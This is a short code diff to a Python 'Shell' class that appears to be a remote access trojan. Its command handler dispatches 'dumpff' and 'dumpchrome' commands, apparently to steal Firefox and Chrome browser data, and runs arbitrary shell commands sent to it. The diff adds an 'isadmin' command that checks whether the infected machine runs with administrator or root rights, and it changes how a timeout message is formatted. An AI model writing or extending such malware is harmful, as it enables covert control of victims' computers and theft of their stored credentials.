@@ -135,7 +135,7 @@ class Shell:
 		timer = threading.Timer(60, self.kill_proc, [proc.pid])
 		timer.start()
 		out = proc.stdout.read() + proc.stderr.read()
-		if self.killed: out += " (Process terminated after taking too long to execute)"
+		if self.killed: out += "\n(Process terminated after taking too long to execute)"
 		timer.cancel()
 		self.killed = False
 		return out
@@ -222,6 +222,12 @@ class Shell:
 		for t in self.threads:
 			t.stop()
 		return "[*] Stopped"
+		
+	def is_admin(self):
+		if os.name == "nt":
+			return str(__import__("ctypes").windll.shell32.IsUserAnAdmin() != 0)
+		else:
+			return str(os.geteuid() == 0)
 					
 	def handle_command(self, data):
 		command = data.split()[0]
@@ -254,6 +260,8 @@ class Shell:
 			output = self.dumpff()
 		elif command == "dumpchrome":
 			output = self.dumpchrome()
+		elif command == "isadmin":
+			return self.is_admin()
 		else:
 			output = self.execute_shell_command(command+" "+arguments)
 			
